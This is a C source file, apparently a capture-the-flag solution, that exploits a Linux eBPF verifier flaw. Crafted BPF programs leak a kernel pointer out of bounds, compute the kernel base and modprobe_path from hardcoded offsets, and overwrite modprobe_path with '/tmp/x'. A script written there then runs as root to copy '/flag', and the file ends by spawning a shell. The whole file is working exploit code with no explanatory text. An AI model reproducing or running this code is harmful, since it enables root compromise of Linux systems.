#include <stdio.h>
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include "bpf.h"

#define MAP_FD_REG BPF_REG_1
#define STACK_POINTER BPF_REG_10 
#define RETURN_VALUE_REG BPF_REG_0 
#define VULN BPF_REG_7
#define ARRAY_OF_MAPS_OPS_OFF 0xc1d2c0
#define ARRAY_MAP_OPS_OFF 0xc1d9a0
#define MODPROBE_PATH_OFF 0x10be1e0

void logleak(char *s, uint64_t addr){ printf("[*] %s : %#lx\n", s, addr );}

void stop(char *s) { puts(s); getchar();}

static void write_file (const char *file, const char* data, mode_t mode){
	int f = open(file, O_WRONLY | O_TRUNC | O_CREAT, mode);
	if (f < 0){ perror ("open"); exit(1);}
	if((write(f, data, strlen(data))) < 0) {perror("write"); exit(1);};
	close(f);
}

int main(int argc, char **argv){


	// int create_map(int map_type, uint32_t key_size, uint64_t value_size, uint32_t max_entr, int inner_map_fd)
	int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 0x4, 0x8, 0x3, 0);

	logleak("oob FD", map_fd);

	uint64_t shift = 1;
	uint64_t leak = 0;
	update_map(map_fd, 0, &shift, BPF_ANY); 

	struct bpf_insn insns[] = {
		BPF_LD_MAP_FD(MAP_FD_REG, map_fd),
		BPF_MOV64_IMM(BPF_REG_2, 0x0), // key = 0 primer elemento
		BPF_STX_MEM(BPF_DW, STACK_POINTER, BPF_REG_2, -0x8), // set r2
		BPF_MOV64_REG(BPF_REG_2, STACK_POINTER), // set r2
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8), // set r2
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), // R1 = map_fd, R2 = &key
		BPF_JMP_IMM(BPF_JEQ, RETURN_VALUE_REG, 0, 21),

        BPF_LDX_MEM(BPF_DW, BPF_REG_6, RETURN_VALUE_REG, 0),
        BPF_JMP_IMM(BPF_JGE, BPF_REG_6, 2, 19),
        BPF_MOV64_IMM(VULN, 1),
        BPF_ALU64_REG(BPF_LSH, VULN, BPF_REG_6), // 1 << [0, 1]
        BPF_ALU64_IMM(BPF_SUB, VULN, 1),
        BPF_ALU64_IMM(BPF_MUL, VULN, -0xf8),
        BPF_ALU64_REG(BPF_ADD, RETURN_VALUE_REG, VULN),
		BPF_LDX_MEM(BPF_DW, BPF_REG_5, RETURN_VALUE_REG, 0),

        BPF_MOV64_IMM(RETURN_VALUE_REG, 0),

        BPF_MOV64_IMM(BPF_REG_2, 0x1), // key = 1 segundo elemetno donde vamos a escribir el leak
        BPF_STX_MEM(BPF_DW, STACK_POINTER, BPF_REG_2, -0x8), // set r2
		BPF_MOV64_REG(BPF_REG_2, STACK_POINTER), // set r2
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8), // set r2

        BPF_STX_MEM(BPF_DW, STACK_POINTER, BPF_REG_5, -0x10),
		BPF_MOV64_REG(BPF_REG_3, STACK_POINTER),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x10),
		BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),
        BPF_LD_MAP_FD(MAP_FD_REG, map_fd),
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem), // R1 = map_fd, R2 = &key, R3 = &value, R4 = flags
        BPF_JMP_IMM(BPF_JEQ, RETURN_VALUE_REG, 0, 1),
        BPF_MOV64_IMM(BPF_REG_8, 1234),
		BPF_JMP_IMM(BPF_JEQ, RETURN_VALUE_REG, 0, 0),
		BPF_MOV64_IMM(RETURN_VALUE_REG, 0x0),
      
		BPF_EXIT_INSN()
	};


	puts("=========== STARTING FIRST PROGRAM ==============");
	int prog_fd = create_prog(insns, sizeof(insns) / sizeof(struct bpf_insn));
	puts("=========== ENDING FIRST PROGRAM ==============");

	lookup_map(map_fd, 1, &leak);

	printf("[*] Shifted with %#lx now map_array[1] is %#lx\n", shift, leak);

	unsigned long kbase = (unsigned long)leak - 0xc1d9a0;
	unsigned long modprobe_path = kbase + MODPROBE_PATH_OFF;

	logleak("kernel base", kbase);
	logleak("array_map_ops", kbase + ARRAY_MAP_OPS_OFF);
	logleak("array_of_maps_ops", kbase + ARRAY_OF_MAPS_OPS_OFF);
	logleak("modprobe_path", modprobe_path);
   
	unsigned long mod2 = modprobe_path+4;
    update_map(map_fd, 1, &modprobe_path, BPF_ANY);
	update_map(map_fd, 2, &mod2, BPF_ANY);

	struct bpf_insn insns2[] = {
		BPF_LD_MAP_FD(MAP_FD_REG, map_fd),
		BPF_MOV64_IMM(BPF_REG_2, 0x0), // key = 0 primer elemento
		BPF_STX_MEM(BPF_DW, STACK_POINTER, BPF_REG_2, -0x8), // set r2
		BPF_MOV64_REG(BPF_REG_2, STACK_POINTER), // set r2
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8), // set r2
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), // R1 = map_fd, R2 = &key
		BPF_JMP_IMM(BPF_JEQ, RETURN_VALUE_REG, 0, 14),

        BPF_LDX_MEM(BPF_DW, BPF_REG_6, RETURN_VALUE_REG, 0),
        BPF_JMP_IMM(BPF_JGE, BPF_REG_6, 2, 12),
        BPF_MOV64_IMM(VULN, 1),
        BPF_ALU64_REG(BPF_LSH, VULN, BPF_REG_6), // 1 << [0, 1]
        BPF_ALU64_IMM(BPF_SUB, VULN, 1),
        BPF_MOV64_REG(BPF_REG_9, VULN),
        BPF_ALU64_IMM(BPF_MUL, VULN, -0xf8),
        BPF_ALU64_REG(BPF_ADD, RETURN_VALUE_REG, VULN),
        BPF_MOV32_IMM(BPF_REG_8, 0xd2c0),
        BPF_STX_MEM(BPF_H, RETURN_VALUE_REG, BPF_REG_8, 0),

        BPF_ALU64_IMM(BPF_MUL, BPF_REG_9, 0x10),
        BPF_ALU64_REG(BPF_ADD, RETURN_VALUE_REG, BPF_REG_9),
        BPF_MOV32_IMM(BPF_REG_8, 0xc),
        BPF_STX_MEM(BPF_W, RETURN_VALUE_REG, BPF_REG_8, 0),


        BPF_MOV64_IMM(RETURN_VALUE_REG, 0x0),
		BPF_EXIT_INSN()
	};

	puts("=========== STARTING SECOND PROGRAM ==============");
	prog_fd = create_prog(insns2, sizeof(insns2) / sizeof(struct bpf_insn));
	puts("=========== ENDING SECOND PROGRAM ==============");


	struct bpf_insn insns3[] = {

		BPF_LD_MAP_FD(MAP_FD_REG, map_fd),
		BPF_MOV64_IMM(BPF_REG_2, 0x1), // key = 1 primer elemento
		BPF_STX_MEM(BPF_DW, STACK_POINTER, BPF_REG_2, -0x8), // set r2
		BPF_MOV64_REG(BPF_REG_2, STACK_POINTER), // set r2
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8), // set r2
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), // R1 = map_fd, R2 = &key
		BPF_JMP_IMM(BPF_JEQ, RETURN_VALUE_REG, 0, 13),

		BPF_MOV64_IMM(BPF_REG_8, 0x706d742f),
		BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),

		BPF_LD_MAP_FD(MAP_FD_REG, map_fd),
		BPF_MOV64_IMM(BPF_REG_2, 0x2), // key = 2 tercer elemento
		BPF_STX_MEM(BPF_DW, STACK_POINTER, BPF_REG_2, -0x8), // set r2
		BPF_MOV64_REG(BPF_REG_2, STACK_POINTER), // set r2
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8), // set r2
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), // R1 = map_fd, R2 = &key
		BPF_JMP_IMM(BPF_JEQ, RETURN_VALUE_REG, 0, 3),

		BPF_MOV64_IMM(BPF_REG_8, 0x782f),
		BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),

        BPF_MOV64_IMM(RETURN_VALUE_REG, 0x0),
		BPF_EXIT_INSN()
	};


	puts("=========== STARTING SECOND PROGRAM ==============");
	prog_fd = create_prog(insns3, sizeof(insns3) / sizeof(struct bpf_insn));
	puts("=========== ENDING SECOND PROGRAM ==============");

	printf("[*] modprobe_path = /tmp/x, check /tmp/flag\n");

	const char* new_path = "/tmp/x";
	const char* script = "#!/bin/sh\ncp /flag /tmp/flag\nchmod 755 /tmp/flag";
	write_file(new_path, script, 0777);

	const unsigned char magic[4] = {0xff, 0xff, 0xff, 0xff};
	write_file("/tmp/dummy", magic, 0777);
	
	//system("/tmp/dummy 2>/dev/null");
	socket(AF_INET, SOCK_STREAM, 123); // this triggers modprobe too
	system("cat /tmp/flag");
	system("/bin/sh"); // prevent kernel panic
	
}